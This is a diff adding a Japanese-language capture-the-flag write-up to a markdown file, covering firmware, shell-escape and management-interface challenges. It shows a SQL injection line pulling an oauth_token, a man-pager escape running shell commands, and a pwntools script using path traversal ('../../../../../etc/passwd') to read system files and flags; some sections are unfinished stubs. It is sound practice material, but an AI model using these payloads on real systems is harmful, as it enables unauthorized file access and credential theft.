@@ -574,5 +574,257 @@ choosing songs from random artist: yotti' UNION SELECT ( SELECT oauth_token FROM
 はいoauth_tokenを抜き出すことができました。
 
 
-## 
-##
+## Rev/FIRMWARE ##
+
+ここからはrevの問題の解説をしていきます。<br>
+まずファイルを解凍するとchallenge.ext4というファイルが出てきます
+
+'''
+net40-dhcp107:gctf yotti$ file challenge.ext4 
+challenge.ext4: Linux rev 1.0 ext4 filesystem data (extents) (64bit) (large files) (huge files)
+'''
+
+これはlinuxのファイルシステムなので、普通にマウントしてあげればokです。<br>
+あとはファイルシステムの中を見ると'.mediapc_backdoor_password.gz' と言うファイルがあるので解凍してあげるとフラッグが出てきます。
+
+ctf='CTF{I_kn0W_tH15_Fs}'
+
+## Rev/GATEKEEPER ##
+
+ファイルを解凍すると、gatekeeperと言うファイルが出てきます。<br>
+まず権限がないので,権限の付与をしてあげ,実行してみます。<br>
+
+'''
+net40-dhcp107:gctf yotti$ file gatekeeper
+gatekeeper: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, not stripped
+'''
+
+とうやらelfファイルのようです。
+
+
+continue 
+
+
+## PWN/MOAR ##
+
+PWNの問題に入っていきます<br>
+まず問題文で書かれていた<br
+'$nc moar.ctfcompetition.com 1337'<br>
+に接続してみます。<br>
+
+'''
+net40-dhcp107:gctf yotti$ nc moar.ctfcompetition.com 1337
+socat(1)                                                              socat(1)
+
+NAME
+ Manual page socat(1) line 1 (press h for help or q to quit)
+       infos.
+ Manual page socat(1) line 2 (press h for help or q to quit)
+       socat [options] <address> <address>
+       socat -V
+       socat -h[h[h]] | -?[?[?]]
+       filan
+       procan
+
+DESCRIPTION
+       Socat  is  a  command  line based utility that establishes two bidirec-
+       tional byte streams  and  transfers  data  between  them.  Because  the
+       streams  can be constructed from a large set of different types of data
+       sinks and sources (see address types),  and  because  lots  of  address
+       options  may be applied to the streams, socat can be used for many dif-
+       ferent purposes.
+
+       Filan is a utility  that  prints  information  about  its  active  file
+       descriptors  to  stdout.  It  has been written for debugging socat, but
+       might be useful for other purposes too. Use the -h option to find  more
+
+'''
+
+どうやらmanコマンドでsocketと言うファイルの説明をしているようです<br>
+あとはmanコマンドから抜けるために!コマンドを使えばokです。<br>
+
+'''
+DESCRIPTION
+       Socat  is  a  command  line based utility that establishes two bidirec-
+       tional byte streams  and  transfers  data  between  them.  Because  the
+       streams  can be constructed from a large set of different types of data
+       sinks and sources (see address types),  and  because  lots  of  address
+       options  may be applied to the streams, socat can be used for many dif-
+       ferent purposes.
+
+       Filan is a utility  that  prints  information  about  its  active  file
+       descriptors  to  stdout.  It  has been written for debugging socat, but
+       might be useful for other purposes too. Use the -h option to find  more
+ Manual page socat(1) line 1 (press h for help or q to quit)
+       infos.
+ Manual page socat(1) line 2 (press h for help or q to quit)!cat /home/moar/disable_dmz/sh
+!cat /home/moar/disable_dmz/sh
+cat: /home/moar/disable_dmz/sh: No such file or directory
+!done  (press RETURN)!ls -l /home/moar
+
+!ls -l /home/moar
+total 4
+-r-xr-xr-x 1 nobody nogroup 695 Jun 26 15:56 disable_dmz.sh
+!done  (press RETURN)!cat /home/moar/disable_dmz.sh
+
+!cat /home/moar/disable_dmz.sh
+#!/bin/sh
+
+# Copyright 2018 Google LLC
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     https://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+
+echo 'Disabling DMZ using password CTF{SOmething-CATastr0phic}'
+echo CTF{SOmething-CATastr0phic} > /dev/dmz
+!done  (press RETURN)n
+'''
+
+はい、フラッグ入手です<br>
+flag: 'CTF{SOmething-CATastr0phic} '
+
+## Rev/admin ##
+
+'nc mngmnt-iface.ctfcompetition.com 1337' <br>
+サーバーへ接続してみます
+
+'''
+net40-dhcp107:gctf yotti$ nc mngmnt-iface.ctfcompetition.com 1337
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+2
+The following patchnotes were found:
+ - Version0.3
+ - Version0.2
+Which patchnotes should be shown?
+Version0.2
+# Release 0.2
+ - Updated library X to version 0.Y
+ - Fixed path traversal bug
+ - Improved the UX
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+2
+The following patchnotes were found:
+ - Version0.3
+ - Version0.2
+Which patchnotes should be shown?
+Version0.3
+# Version 0.3
+ - Rollback of version 0.2 because of random reasons
+ - Blah Blah
+ - Fix random reboots at 2:32 every second Friday when it's new-moon.
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+
+'''
+
+試しに接続して色々やってみると、どうやら2でflagの場所を入力するみたいです<br>
+毎回接続するのはめんどくさいのでpythonでプログラムを作って実行します。<br>
+
+何回か接続を試しながら作ったものです.
+
+'''
+#! /usr/bin/env python2                                                                                 
+
+from pwn import *
+
+host = 'mngmnt-iface.ctfcompetition.com'
+port = 1337
+
+s = remote(host,port)
+s.recv()
+s.recv()
+s.sendline("2")
+s.recv()
+s.recv()
+s.sendline("../../../../../etc/passwd")
+print s.recv()
+print s.recv()
+s.close()
+
+'''
+
+実行すると<br>
+
+'''
+net40-dhcp107:script yotti$ ./admin1.py
+[+] Opening connection to mngmnt-iface.ctfcompetition.com on port 1337: Done
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/
+usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+user:x:1337:1337::/home/user:
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+
+[*] Closed connection to mngmnt-iface.ctfcompetition.com port 1337
+'''
+
+のようになります<br>
+user:x:1337:1337::/home/user:<br>
+なのでプログラムの部分を/home/user/flagに書き直したらflagがでてきました。<br>
+
+'''
+net40-dhcp107:script yotti$ ./admin1.py
+[+] Opening connection to mngmnt-iface.ctfcompetition.com on port 1337: Done
+CTF{I_luv_buggy_sOFtware}
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+
+[*] Closed connection to mngmnt-iface.ctfcompetition.com port 1337
+'''
+
+flag:'CTF{I_luv_buggy_sOFtware}'
+
+## PWN/ADMIN2 ##
+
+先ほどと同じサーバでの問題です<br>
+
+'''
+That first flag was a dud, but I think using a similar trick to get the full binary file might be needed here. There is a least one password in there somewhere. Maybe reversing this will give you access to the authenticated area, then you can turn up the heat… literally.
+'''
+
+まず実行可能ファイルを取得します。<br>
+'../../../../../../proc/self/cmdline'と入力すると'../main'とでてくるのでここにダンプされた実行ファイルを取得します<br>
+
+'print'
